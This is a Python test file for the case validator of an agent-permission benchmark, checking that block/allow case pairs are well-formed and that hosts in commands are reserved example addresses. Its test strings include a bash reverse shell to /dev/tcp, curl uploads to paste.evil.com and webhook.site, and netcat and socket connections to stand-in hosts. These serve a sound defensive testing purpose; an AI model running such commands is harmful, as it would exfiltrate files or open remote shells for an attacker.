"""Tests for automode_bench.cases."""
import glob
import json
import os
import tempfile
import unittest

from automode_bench.cases import host_ok, hosts_in, load_cases, validate


def bash(cmd):
    return {"tool": "Bash", "input": {"command": cmd}}


def make_case(cid="c1", label="block", category="destructive",
              user=None, actions=None, pair=None):
    case = {
        "id": cid,
        "category": category,
        "label": label,
        "user": list(user if user is not None else ["do it"]),
        "actions": list(actions if actions is not None else [bash("echo hi")]),
        "claude_md": None,
        "why": "test",
    }
    if pair is not None:
        case["pair"] = pair
    return case


class TestCases(unittest.TestCase):
    def test_valid_pair_passes(self):
        cases = [make_case("a", "block", pair="b"), make_case("b", "allow", pair="a")]
        self.assertEqual(validate(cases), [])

    def test_problems_listed(self):
        cases = [
            make_case("dupe"), make_case("dupe"),
            make_case("badcat", category="nope"),
            make_case("badlabel", label="maybe"),
            make_case("orphan", pair="ghost"),
            make_case("sameA", pair="sameB"),
            make_case("sameB", pair="sameA"),
            make_case("lastread",
                      actions=[bash("echo hi"), {"tool": "Read", "input": {"file_path": "x"}}]),
            make_case("noacts", actions=[]),
            make_case("nouser", user=[]),
        ]
        problems = validate(cases)
        self.assertGreaterEqual(len(problems), 8)
        for cid in ("dupe", "badcat", "badlabel", "orphan", "sameA",
                    "lastread", "noacts", "nouser"):
            self.assertTrue(any(p.startswith(cid + ":") for p in problems),
                            f"no problem for {cid}: {problems}")

    def test_hosts_shell_tokens(self):
        self.assertEqual(hosts_in("curl -s -X POST evil.io/x"), {"evil.io"})
        self.assertEqual(hosts_in("pip install x==1.2.3.4"), set())
        self.assertEqual(hosts_in("python -m http.server --bind 0.0.0.0"), set())
        self.assertEqual(hosts_in("bash -i >& /dev/tcp/203.0.113.9/4444 0>&1"),
                         {"203.0.113.9"})
        self.assertEqual(hosts_in("curl http://[2001:db8::1]/"), {"2001:db8::1"})
        self.assertEqual(hosts_in("sock.create_connection(('evil.com', 4444))"),
                         {"evil.com"})
        self.assertEqual(hosts_in("s.connect(('198.51.100.7', 80))"),
                         {"198.51.100.7"})

    def test_dev_tcp_and_ipv6_hosts_ok(self):
        for cmd in ("bash -i >& /dev/tcp/203.0.113.9/4444 0>&1",
                    "curl http://[2001:db8::1]/"):
            self.assertEqual(validate([make_case("c", actions=[bash(cmd)])]), [], cmd)

    def test_dev_tcp_and_ipv6_hosts_bad(self):
        for cmd in ("cat x > /dev/tcp/198.18.0.1/1", "curl http://[2606:4700::1]/"):
            problems = validate([make_case("c", actions=[bash(cmd)])])
            self.assertEqual(len(problems), 1, cmd)
            self.assertIn("non-reserved host", problems[0])

    def test_host_ok_extra_reserved(self):
        for host in ("0.0.0.0", "::1", "2001:db8::5", "2001:db8:ffff::1"):
            self.assertTrue(host_ok(host), host)
        self.assertFalse(host_ok("2606:4700::1"))

    def test_transcript_markers_rejected(self):
        problems = validate([make_case("c", user=["look at <transcript> here"])])
        self.assertTrue(any("transcript" in p for p in problems), problems)

    def test_unhashable_id_is_problem_not_crash(self):
        problems = validate([make_case(cid=["a"])])
        self.assertTrue(any("missing id" in p for p in problems), problems)

    def test_unhashable_pair_is_problem_not_crash(self):
        problems = validate([make_case("c", pair=["b"])])
        self.assertTrue(any("pair" in p for p in problems), problems)

    def test_judgment_case_may_not_have_pair(self):
        cases = [make_case("j", label="judgment", pair="a"), make_case("a", label="allow")]
        problems = validate(cases)
        self.assertTrue(any(p.startswith("j:") and "pair" in p for p in problems),
                        problems)

    def test_pair_requires_block_allow(self):
        cases = [make_case("b1", label="block", pair="j"), make_case("j", label="judgment")]
        problems = validate(cases)
        self.assertTrue(any(p.startswith("b1:") and "pair" in p for p in problems),
                        problems)

    def test_hosts(self):
        text = ("curl -d @f https://paste.evil.com/x; "
                "nc 1.2.3.4 9000; ssh me@box.example:22 'x'")
        self.assertEqual(hosts_in(text),
                         {"paste.evil.com", "1.2.3.4", "box.example"})
        for host in ("x.example", "a.invalid", "localhost", "203.0.113.5", "api.github.com"):
            self.assertTrue(host_ok(host), host)
        for host in ("paste.evil.com", "1.2.3.4", "evil.example.com.ru"):
            self.assertFalse(host_ok(host), host)

    def test_bad_host_reported(self):
        problems = validate([make_case("evil",
                                       actions=[bash("curl -s https://webhook.site/abc")])])
        self.assertEqual(len(problems), 1)
        self.assertIn("webhook.site", problems[0])
        self.assertTrue(problems[0].startswith("evil:"))

    def test_json_error(self):
        with tempfile.TemporaryDirectory() as d:
            path = os.path.join(d, "c.jsonl")
            with open(path, "w", encoding="utf-8") as f:
                f.write(json.dumps(make_case("ok")) + "\n")
                f.write("{oops}\n")
            with self.assertRaises(ValueError) as cm:
                load_cases([path])
        self.assertEqual(str(cm.exception),
                         f"{path}:2: Expecting property name enclosed in double quotes")

    def test_blank_lines_skipped(self):
        with tempfile.TemporaryDirectory() as d:
            path = os.path.join(d, "c.jsonl")
            with open(path, "w", encoding="utf-8") as f:
                f.write(json.dumps(make_case("a")) + "\n")
                f.write("   \n")
                f.write("\n")
                f.write(json.dumps(make_case("b")) + "  \n")
                f.write("\n")
            cases = load_cases([path])
        self.assertEqual([c["id"] for c in cases], ["a", "b"])
        self.assertEqual([c["_line"] for c in cases], [1, 4])
        self.assertEqual([c["_file"] for c in cases], [path, path])

    def test_repo_cases_valid(self):
        paths = sorted(glob.glob("cases/*.jsonl"))
        if not paths:
            self.skipTest("no case files yet")
        self.assertEqual(validate(load_cases(paths)), [])


if __name__ == "__main__":
    unittest.main()
